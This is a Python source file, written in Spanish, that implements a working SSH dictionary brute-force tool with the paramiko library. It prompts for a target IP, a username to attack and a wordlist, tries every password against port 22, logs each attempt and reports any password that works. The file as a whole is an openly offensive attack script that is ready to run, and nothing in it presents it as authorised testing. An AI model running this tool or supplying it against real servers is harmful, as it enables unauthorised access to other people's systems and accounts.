import paramiko
import time
import datetime

class SSHBruteForcer:
    def __init__(self, host, port, username, diccionario_path):
        self.host = host
        self.port = port
        self.username = username
        self.diccionario_path = diccionario_path
        self.resultado = None
        self.intentos = []
        self.log_file = f"ssh_brute_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    def intentar_login(self, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.host, port=self.port, username=self.username, password=password, timeout=5)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            print(f"[!] Error de conexión: {e}")
            time.sleep(1)
            return False
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            return False

    def registrar_intento(self, password, exito):
        estado = "EXITO" if exito else "FALLIDO"
        self.intentos.append((password, estado))
        with open(self.log_file, "a") as f:
            f.write(f"Intento con '{password}': {estado}\n")

    def fuerza_bruta(self):
        with open(self.diccionario_path, 'r', encoding='utf-8', errors='ignore') as diccionario:
            for linea in diccionario:
                password = linea.strip()
                print(f"[~] Probando contraseña: {password}")
                exito = self.intentar_login(password)
                self.registrar_intento(password, exito)

                if exito:
                    self.resultado = password
                    print(f"[+] Contraseña encontrada: {password}")
                    break

        if not self.resultado:
            print("[!] No se encontró una contraseña válida.")

    def resumen(self):
        print("\n===== RESUMEN DEL ATAQUE =====")
        for intento in self.intentos:
            print(f"Contraseña: {intento[0]} - Resultado: {intento[1]}")
        if self.resultado:
            print(f"\n[+] Contraseña débil detectada: {self.resultado}")
        else:
            print("\n[!] No se detectó ninguna contraseña débil.")

# Ejemplo de uso
if __name__ == "__main__":
    host = input("[*] IP del servidor SSH: ")
    username = input("[*] Usuario a atacar: ")
    diccionario_path = input("[*] Ruta del diccionario de contraseñas: ")

    atacante = SSHBruteForcer(host, port=22, username=username, diccionario_path=diccionario_path)
    atacante.fuerza_bruta()
    atacante.resumen()